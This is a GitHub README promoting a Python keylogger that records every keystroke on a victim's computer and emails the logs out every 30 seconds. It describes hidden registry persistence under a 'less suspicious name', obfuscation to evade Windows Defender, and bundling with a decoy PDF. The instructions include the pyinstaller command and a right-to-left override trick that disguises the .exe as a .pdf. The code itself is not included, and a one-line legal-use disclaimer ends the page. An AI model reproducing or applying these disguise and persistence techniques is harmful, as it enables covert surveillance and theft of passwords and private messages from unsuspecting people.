<img alt="GitHub" src="https://img.shields.io/github/license/Purbayan2014/Key_log_minified?style=plastic">

# About

 This is a keylogger based in python which when executed records all the keystrokes of the system it has been executed on and sends to your email every 30 secs.
 Upon executing even if the victim deletes the file it creates a hidden temp folder in the victim's system and then adds a registry key with a less suspicious name 
 which executes every time upon startup.It has been merged with a pdf,jpg,etc or whatever file they want to merge it  which can be of any type.
 
 
 # Features
 
 1. Lightweight as compared to other key-loggers.
 2. Time delay can be customized.
 3. Obfuscated version. 
 4. Comparably Less detection in windows defender.
 5. Send an email with embedded key logs.
 6. Can be easily configured.

# Download

1. Clone the repo --- > git clone https://github.com/Purbayan2014/Key_log_minified.git
2. Cd into the repository ------- > cd Key_log_minified/
 
 
 
 # Instructions
 
 While using it just change the email_id and the email_password in the paramters.
 
 To compile it into a exe file just use pyinstaller and then we can add any icon we can like 
 
 pyinstaller <.py> --onefile --noconsole --add-data "<merged_file_directory>;." --<icon_path>

 
 Example --- > PS E:\test_this> pyinstaller copy.py --onefile --noconsole --add-data "E:\test_this\cyber.pdf;." --icon E:\test_this\pdf.ico
 
 
 Once being succesfully compiled the .exe file will be located in the dist folder.
 
 ![image](https://user-images.githubusercontent.com/90950629/148672363-52a3b277-d1b8-401e-9bcf-5e1637dbe595.png)

Here, i have used a unicode character called left to right ovveride which overides the .exe extension to the left side and the .pdf extension to the right side.

 # Note

Key_log_minified is only to be used for legal applications when the explicit permission of the targeted organization has been obtained.
 

 
 
